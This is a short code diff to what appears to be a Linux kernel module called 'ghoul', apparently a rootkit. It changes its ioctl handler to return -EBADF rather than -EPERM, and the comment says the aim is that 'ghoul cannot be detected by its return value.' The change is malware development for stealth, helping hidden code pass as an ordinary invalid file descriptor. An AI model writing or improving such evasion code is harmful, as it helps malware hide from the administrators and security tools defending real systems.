@@ -40,8 +40,8 @@ int handle_ioctl_request(unsigned int fd, unsigned int cmd, unsigned long arg)
             break;
     }
     /*
-     * -EPERM is the error that is returned when performing an ioctl operation on an invalid fd.
+     * -EBADF is the error that is returned when performing an ioctl operation on an invalid fd.
      * Return this so that ghoul cannot be detected by its return value.
      */
-    return -EPERM;
+    return -EBADF;
 }
